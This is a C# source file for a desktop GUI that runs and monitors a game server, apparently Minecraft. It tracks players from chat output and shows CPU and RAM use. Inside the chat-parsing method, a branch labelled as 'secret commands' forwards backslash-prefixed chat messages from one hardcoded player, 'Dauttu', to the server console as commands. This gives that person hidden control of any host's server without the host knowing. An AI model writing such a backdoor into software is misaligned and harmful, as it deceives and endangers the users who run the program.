using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Windows;
using System.Threading.Tasks;
using System.Linq;


namespace MS_GUI
{
    class Command
    {
        // Create a new instance of the server
        public Process server = new Process();

        // Instance of the command class
        public Command() { }

        //private int RamAmount = 0;

        // Holds the players currently online
        List<string> Users = new List<string>();

        /// <summary>
        /// Create the CMD server 
        /// </summary>
        public async Task InitialiseCMD(string args)
        {
            await Task.Run(() =>
            {
                // Tell it we want a command line
                server.StartInfo.FileName = "CMD.exe";

                // Give the args - mainly how much RAM you want
                server.StartInfo.Arguments = "/c " + args;

                // Get the ram amount
                //RamAmount = int.Parse(args[9..^33]);

                // So the user doesn't see the CMD - FIND A WAY TO KILL THIS PROCESS WHEN THE APP ENDS
                server.StartInfo.CreateNoWindow = true;

                // Use pure CMD
                server.StartInfo.UseShellExecute = false;

                // Allows commands to be retrieved from the server
                server.StartInfo.RedirectStandardOutput = true;
                server.StartInfo.RedirectStandardError = true;

                // Allows commands to be sent to the server
                server.StartInfo.RedirectStandardInput = true;

                // Get the ouput data and send it to the user
                server.OutputDataReceived += new DataReceivedEventHandler(GetServerOutput);

                // Start the server
                server.Start();
                server.BeginOutputReadLine();
                ProcStats();
                server.WaitForExit();
            });
        }

        /// <summary>
        /// Commands to be sent to the CMD from the user
        /// </summary>
        /// <param name="inCommand"></param>
        public void SendCommand(string inCommand)
        {
            try
            {
                // Check to see if there is a command
                if (inCommand != "")
                    server.StandardInput.WriteLine(inCommand);
            }
            catch
            {
                MessageBox.Show("Unable to send command!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        /// <summary>
        /// Gets server information to update GUI
        /// </summary>
        public void GetServerOutput(Object sendingProcess, DataReceivedEventArgs outInfo)
        {
            if (outInfo.Data == null)
                Environment.Exit(0);

            // Check if players join or leave 
            if (outInfo.Data.Contains('>'))
            {
                string userName = outInfo.Data.Split('<', '>')[1].Trim();
                string message = outInfo.Data.Split('>')[1].Trim();

                // Secret commands for individual users who are not server host
                if (userName == "Dauttu" && message.StartsWith(@"\"))
                {
                    SendCommand(message.Remove(0, 1));
                }
            }
            // Add players online
            else if (outInfo.Data.Contains("joined the game"))
            {
                string userName = outInfo.Data[32..^15].Trim();

                // Invoke the UI thread 
                Application.Current.Dispatcher.Invoke(() =>
                {
                    MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;

                    // Adds the user online to the list
                    string onlineUsers = "";
                    Users.Add(userName);

                    foreach (var u in Users)
                    {
                        onlineUsers += u + "\n";
                    }

                    // Creates a string that populates the text box
                    mainWindow.PlayersTextBox.Text = onlineUsers;
                });

            }
            // Take players offline
            else if (outInfo.Data.Contains("lost connection: Disconnected"))
            {
                string userName = outInfo.Data[32..^30].Trim();

                // Invoke the UI thread 
                Application.Current.Dispatcher.Invoke(() =>
                {
                    MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;

                    // Removes the user who has left
                    string onlineUsers = "";

                    Users.RemoveAll(u => u == userName);

                    foreach (var u in Users)
                    {
                        onlineUsers += u + "\n";
                    }

                    // Creates a string that populates the text box
                    mainWindow.PlayersTextBox.Text = onlineUsers;
                });
            }
            else if (outInfo.Data.Contains("left the game"))
            {
                string userName = outInfo.Data[32..^13].Trim();

                // Invoke the UI thread 
                Application.Current.Dispatcher.Invoke(() =>
                {
                    MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;

                    // Removes the user who has left
                    string onlineUsers = "";

                    Users.RemoveAll(u => u == userName);

                    foreach (var u in Users)
                    {
                        onlineUsers += u + "\n";
                    }

                    // Creates a string that populates the text box
                    mainWindow.PlayersTextBox.Text = onlineUsers;
                });
            }

            if (Application.Current != null)
            {
                // Invoke the UI thread 
                Application.Current.Dispatcher.Invoke(() =>
                {
                    MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;

                    mainWindow.InfoTextBox.Text += outInfo.Data + "\n";
                });
            }
        }

        /// <summary>
        /// Displays process information
        /// </summary>
        private void ProcStats()
        {
            long memoryUsage = 0;

            string cpuUsage = "";

            // New thread to constantly update with RAM and CPU usage
            Thread t = new Thread(() =>
            {
                while (1 < 2)
                {   // Gets the server process
                    foreach (var process in Process.GetProcessesByName("java"))
                    {
                        // Calculates the CPU usages
                        var startTime = DateTime.Now;
                        var startCpuUsage = process.TotalProcessorTime;

                        Thread.Sleep(500);

                        var endTime = DateTime.Now;
                        var endCpuUsage = process.TotalProcessorTime;

                        var cpuUsedMs = (endCpuUsage - startCpuUsage).TotalMilliseconds;
                        var totalMsPassed = (endTime - startTime).TotalMilliseconds;

                        var cpuUsageTotal = cpuUsedMs / (Environment.ProcessorCount * totalMsPassed);

                        // Gets the RAM usage
                        memoryUsage = process.WorkingSet64 / (1024 * 1024);
                        cpuUsage = string.Format("{0:0.0}", cpuUsageTotal * 100);
                    }


                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;

                        mainWindow.RamStatsTextBlock.Text = memoryUsage + " MB";
                        mainWindow.cpuStatsTextBlock.Text = cpuUsage + "%";
                    });
                }

            });

            t.Start();
        }
    }
}
